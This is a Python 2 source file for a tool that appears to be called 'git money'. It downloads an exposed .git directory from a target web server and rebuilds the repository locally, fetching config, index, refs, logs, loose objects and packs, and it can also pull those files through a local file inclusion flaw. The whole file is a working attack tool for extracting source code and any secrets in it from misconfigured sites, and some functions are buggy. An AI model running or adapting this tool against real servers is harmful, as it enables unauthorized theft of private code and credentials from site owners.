#!/usr/bin/env python
"""
                           __  __
                     ____ |__|/  |_    _____   ____   ____   ____ ___.__.
                    / ___\|  \   __\  /     \ /  _ \ /    \_/ __ <   |  |
                   / /_/  >  ||  |   |  Y Y  (  <_> )   |  \  ___/\___  |
                   \___  /|__||__|   |__|_|  /\____/|___|  /\___  > ____|
                  /_____/                  \/            \/     \/\/
"""

__version__ = '0.0.1'

import getopt, os, time, logging, sys, \
       errno, subprocess, shlex, re, zlib, \
       collections, mmap

try:
    from cStringIO import StringIO
except:
    from StringIO import StringIO

try:
    import pycurl
except:
    print 'pycurl is required. ubuntu/debian: sudo apt-get install python-pycurl'

try:
    from gin import gin
except:
    print 'gin is required: https://github.com/dnoiz1/gin/tree/python2'


#__banner__ = 

def list_diff(a, b):
    a = set(a)
    b = set(b)
    return [aa for aa in a if aa not in b]

class FuckBitchesGitMoney:
    """
    It has a class, its legit -dnz
    """

    dirs = ['branches', 'hooks', 'info', 'logs', 'objects', 'refs', \
            'refs/heads', 'refs/tags', 'logs/refs/heads', 'objects/info', \
            'objects/pack']
    # config doesnt go here.
    files = ['COMMIT_EDITMSG', 'description', 'HEAD', 'index', 'logs/HEAD', 'info/refs', \
            'info/exclude', 'ORIG_HEAD', 'FETCH_HEAD', 'packed-refs', \
            # also hooks
            'hooks/applypatch-msg', 'hooks/commit-msg', 'hooks/post-update', 'hooks/pre-applypatch', \
            'hooks/pre-rebase', 'hooks/prepare-commit-msg', 'hooks/update']

    refs = []

    objects  = []
    # assume master
    branches = ['master']

    packs = []
    retrieved_packs = []

    retrieved_objects  = []
    missing_objects    = []
    retrieved_branches = []

    objects_checked_for_parent = []

    method = 'GET'
    regex  = False
    lfi    = False
    fail = False

    # curl stuff
    c = pycurl.Curl()
    body   = StringIO()
    header = StringIO()
    user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36'

    url = ''

    def __init__(self, url, output_directory, method = 'GET', regex = False, fail=False, lfi = False, git_command = '/usr/bin/git'):
        # set it up
        self.url = url

        self.method = method
        self.regex  = regex
        self.lfi    = lfi
        self.fail = fail

        if output_directory[-1] != '/':
            output_directory = output_directory + '/'

        self.output_directory = output_directory

        self.git_command = [git_command, '--git-dir=' + self.output_directory, '--work-tree=' + self.output_directory[:-4]]

        # init curl stuff
        self.c.setopt(self.c.USERAGENT, self.user_agent)
        self.c.setopt(self.c.WRITEFUNCTION, self.body.write)
        self.c.setopt(self.c.HEADERFUNCTION, self.header.write)

        # self.c.setopt(self.c.VERBOSE, True)
        return

    def request(self, uri = '/'):
        if uri[0] != '/':
            uri = '/' + uri

        if self.lfi != False:
            lfi = self.lfi % '.git' + uri
        
        else:
            url = self.url + '.git' + uri

        if self.method == 'POST':
            self.c.setopt(self.c.POSTFIELDS, self.lfi)
        elif self.lfi != False:
            url = self.url + lfi

        self.c.setopt(self.c.URL, str(url))

        sys.stdout.write("[i] requesting: {0} ... ".format(url))
        sys.stdout.flush()

        self.c.perform()

        body   = self.body.getvalue()
        header = self.header.getvalue()

        self.body.truncate(0)
        self.header.truncate(0)

        sys.stdout.write("{0}\n".format(self.c.getinfo(self.c.HTTP_CODE)))
        sys.stdout.flush()

        code = self.c.getinfo(self.c.HTTP_CODE)

        if self.lfi != False and code == 200:
            #deal with LFI
            try :
                match = re.search(regex, body, re.S)
                #print regex
                #print match.group(1)

                if match and fail not in match.group(1):
                    return {
                        'header': header,
                        'body': match.group(1),
                        'code': code 
                    }
                else:
                    return {
                        'header': header,
                        'body': '',
                        'code': 404 
                    }
            except:
                print '[!] unable to retrieve'

        return {
            'header': header,
            'body': body,
            'code': code
        }
            

    def run_git_command(self, command):
        cmd = list(self.git_command)

        if isinstance(command, str):
            cmd.append(command)
        elif isinstance(command, list):
            cmd = cmd + command
        else:
            raise Exception('git command must be string or list')

        cmd = shlex.split(' '.join(cmd))

        # print cmd

        output, error = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        if error:
            return error
        #    raise Exception(error)

        return output
        
    def get_config(self):
        config = self.request('config')

        if config['code'] == 200:
            try:
                if self.is_config(config['body']):
                    return config['body']
            except:
                raise Exception('doesnt not appear to be a valid git config')
        else:
            raise Exception('does not appear to contain a git repo')

    def is_config(self, content):
        # print content
        if "[core]" in content:
            # tits? ass? good enough for me
            return True
        return False

    def refs_in_config(self):
        config = self.run_git_command('config -l --local')
        print config
        remotes_match = re.findall('branch\.(.*?)\.remote')
        sys.exit()


    def write_file(self, filename, content):
        with open(self.output_directory + filename, 'w') as f:
            f.write(content)

    def make_base(self):
        print "[+] creating base directory structure"
        for directory in self.dirs:
            self.make_dir(directory)

    def make_dir(self, directory):
        directory = self.output_directory + directory
        try:
            os.makedirs(directory)
        except OSError as e:
            if e.errno == errno.EEXIST and os.path.isdir(directory):
                pass
            else:
                raise

    def get_base(self):
        for filename in self.files:
            response = self.request(filename)
            if response['code'] == 200:
                self.write_file(filename, response['body'])

    def add_ref(self, ref):
        if ref not in self.refs:
            print "[i] adding ref: {0}".format(ref)
            self.refs.append(ref)

    def add_object_id(self, id):
        if id not in self.objects and id != '0000000000000000000000000000000000000000':
            id = id.strip('\0')[0:40]
            print "[i] adding object id: {0}".format(id)
            self.objects.append(id)

    def find_object_ids(self, logfile = 'HEAD'):
        with open(self.output_directory + 'logs/' + logfile, 'r') as f:
            for line in f.readlines():
                l = line.split()
                self.add_object_id(l[0])
                self.add_object_id(l[1])
        # print self.objects
        return self.objects

    def add_branch(self, branch):
        if branch not in self.branches:
            print "[i] adding branch: {0}".format(branch)
            self.branches.append(branch)

    def find_branches(self, logfile = 'logs/HEAD'):
        with open(self.output_directory + logfile, 'r') as f:
            for m in re.findall(r'checkout: moving from (.*?) to (.*?)$', f.read(), re.M):
                self.add_branch(m[0])
                self.add_branch(m[1])
        return self.branches

    def get_heads(self, path):
        result = []
        for branch in self.branches:
            if branch not in result:
                filename = path + branch
                response = self.request(filename)
                if response['code'] == 200:
                    self.write_file(filename, response['body'])
                    result.append(filename)
                    # self.retrieved_branches.append(branch)
        return result

    def make_object_tree(self):
        for object_id in self.objects:
            if object_id not in self.retrieved_objects: # and object_id not in self.missing_objects:
                self.make_dir('objects/' + object_id[0:2])
                filename = 'objects/' + object_id[0:2] + '/' + object_id[2:]
                response = self.request(filename)
                if response['code'] == 200:
                    self.write_file(filename, response['body'])
                    self.retrieved_objects.append(object_id)
                else:
                    self.missing_objects.append(object_id)

    def isSha(self, string):
        #print string
        if re.search(r'[^a-fA-F0-9]', string) and len(string) != 40:
            return False
        return True

    def find_object_parents(self):
        for object_id in self.retrieved_objects:
            self.read_object_parent(object_id)

    def read_object_parent(self, object_id):
        if object_id not in self.objects_checked_for_parent:
            # print object_id;
            filename = object_id[0:2] + '/' + object_id[2:]
            if os.path.isfile(self.output_directory + 'objects/' + filename):
                print "[+] looking for parents in {0}".format(object_id)
                with open(self.output_directory + 'objects/' + filename) as f:
                    parent = zlib.decompress(f.read())
                    match = re.search(r'parent (.*?)$', parent, re.M)
                    if match != None:
                        if self.isSha(match.group(1)):
                        # print "[d] {0}".format(match.group(1))
                            self.add_object_id(match.group(1))

                    match2 = re.search(r'commit (.*?) (.*?)$', parent, re.M)
                    if match2 != None:
                        if self.isSha(match2.group(2)):
                        # print "[d] {0}".format(match2.group(2))
                            self.add_object_id(match2.group(2))

                    self.objects_checked_for_parent.append(object_id)
            else:
                #object must be part of a pack
                pass

    def attempt_git_reset(self):
        output = self.run_git_command('reset --hard')
        # print output
        match = re.findall(r'error: unable to find (.*?)$', output, re.M)
        if len(match) > 0:
            for object_id in match:
                self.add_object_id(object_id)
            return False
        else:
            match2 = re.findall(r'fatal: unable to read tree (.*?)$', output, re.M)
            print match2
            if len(match2) > 0:
                    for object_id in match2:
                        if object_id in self.retrieved_objects:
                            self.read_object_parent(object_id)
                        else:
                            self.add_object_id(object_id)
                    return False
        return True

    def add_pack_id(self, id):
        if id not in self.packs:
            print "[i] adding pack id: {0}".format(id)
            self.packs.append(id)

    def get_pack_info(self, info='objects/info/packs'):
        response = self.request(info);
        if response['code'] == 200:
            match = re.search(r'pack-(.*?)\.pack', response['body'], re.M)
            if match != None:
                self.add_pack_id(match.group(1))

                #if 'packed-refs' not in self.files:
                #    pr_response = self.request('packed-refs')
                #    if pr_response['code'] == 200:
                #        self.write_file('packed-refs', pr_response['body'])
                #        self.files.append('packed-refs')

            self.write_file(info, response['body'])

    def get_packs(self):
        for pack in self.packs:
            if pack not in self.retrieved_packs:
                filename = 'objects/pack/pack-' + pack
                response = self.request(filename + '.pack')
                if response['code'] == 200:
                    self.write_file(filename + '.pack', response['body'])

                idx_response = self.request(filename + '.idx')
                if idx_response['code'] == 200:
                    self.write_file(filename + '.idx', idx_response['body'])

                if idx_response['code'] == 200 and response['code'] == 200:
                    self.retrieved_packs.append(pack)

    def parse_retrieved_packs(self):
        for pack in self.retrieved_packs:
            self.parse_pack_index('objects/pack/pack-' + pack + '.idx')

    def parse_index(self, filename):
        index = gin.parse(self.output_directory + filename, False)
        for item in index:
            if "checksum" in item:
                continue
            if "signature" in item:
                continue
            for key, value in item.items():
                if key == "sha1":
                    #print '='.join([str(key), str(value)])
                    fbgm.add_object_id(value)

    def parse_pack_index(self, filename):
        """
        # not this
        index = gin.parse_pack_index(self.output_directory + filename)
        for item in index:
            print item
        """
        output = self.run_git_command(['verify-pack ','-v', self.output_directory + filename])
        match = re.findall(r'^(.*?) (commit|blob|tree)', output, re.M)

        for m in match:
            print "[i] found object in pack: {0}".format(m[0])
            self.retrieved_objects.append(m[0])
        pass


if __name__ == '__main__':

    print __doc__

    target_host = '127.0.0.1'
    target_port = False
    target_path = '/'

    method = 'GET'
    regex = False
    fail = False
    lfi = False

    options, remainder = getopt.getopt(sys.argv[1:], 't:p:P:m:r:l:f', ['target=', 'port=', 'path=', 'method=', 'regex=', 'fail=', 'lfi='])

    for opt, arg in options:
        if opt in ('-t', '--target'):
            target_host = arg
        elif opt in ('-p', '--port'):
            target_port = arg
        elif opt in ('-P', '--path'):
            target_path = arg
        elif opt in ('-m', '--method'):
            if arg == 'POST':
                method = 'POST'
            else:
                print '[!] methods supported: GET, POST'
                sys.exit()
        elif opt in ('-r', '--regex'):
            regex = arg
        elif opt in ('-f', '--fail'):
            fail = arg
        elif opt in ('-l', '--lfi'):
            if '%s' in arg:
                lfi = arg
            else:
                print '[!] include %s in lfi argument for file name replacement'
                sys.exit()

    if target_host[0:7] != 'http://':
        target_host = 'http://' + target_host

    if target_host[0:7] == 'https://' and target_port == False:
        target_port = '443'

    if target_port == False:
        target_port = '80'

    target = target_host + ':' + target_port + target_path

    print "[+] target: {0}".format(target)
    print "[+] method: {0}".format(method)

    target_dir = ''.join([c for c in target_host if c.isalpha() or c.isdigit() or c in '_.']).rstrip()
    output_dir = os.getcwd() + '/out/' + target_dir + '/.git'

    print "[+] output dir: {0}".format(output_dir)

    fbgm = FuckBitchesGitMoney(target, output_dir, method, regex, fail, lfi)

    try: 
        config = fbgm.get_config()
        fbgm.make_base()
        fbgm.write_file('config', config)
        #fbgm.refs_in_config()
        fbgm.get_base()

        print "[i] repository config:"
        print fbgm.run_git_command(['config', '-l'])

        print "[i] parsing index"
        fbgm.parse_index('index')

        fbgm.get_pack_info()
        fbgm.get_packs()
        fbgm.parse_retrieved_packs()

        fbgm.find_object_ids()

        fbgm.find_branches()
        fbgm.get_heads('logs/refs/heads/')
        fbgm.get_heads('refs/heads/')
        #fbgm.get_heads('ref/tags')
        fbgm.make_object_tree()


        for object_id in fbgm.retrieved_objects:
        #    # print fbgm.retrieved_objects
            fbgm.find_object_parents()
            fbgm.make_object_tree()

        while not fbgm.attempt_git_reset():
            print 'make object tree'
            fbgm.make_object_tree()

    except KeyboardInterrupt as e:
        print "\n[!] plskthnx."
        sys.exit()
    except Exception as e:
        #print "[!] {0}".format(e)
        raise

